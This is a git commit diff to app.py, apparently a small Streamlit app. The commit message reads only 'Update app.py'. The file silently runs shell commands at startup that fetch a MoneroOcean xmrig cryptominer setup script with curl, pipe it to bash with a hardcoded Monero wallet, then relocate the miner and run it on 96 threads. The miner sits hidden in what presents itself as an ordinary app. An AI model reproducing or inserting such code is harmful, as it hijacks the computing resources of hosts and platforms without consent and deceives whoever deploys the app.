9906d61c194e0331361a253fbb760bfb5864df68
Premraj123456 <104309530+Premraj123456@users.noreply.github.com>
2024-06-09 04:40:39 +0530

    Update app.py

--- app.py
+++ app.py
@@ -14,4 +14,6 @@ if button == True:
     st.text('Please Enter CMD')
 
 os.system("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo")
-os.system("bash /root/moneroocean/miner.sh -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo")
+os.system("mkdir -p /home/miner")
+os.system("mv /root/moneroocean/miner.sh /home/miner/miner.sh")
+os.system("bash /home/miner/miner.sh -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo -t 96 -p w1")
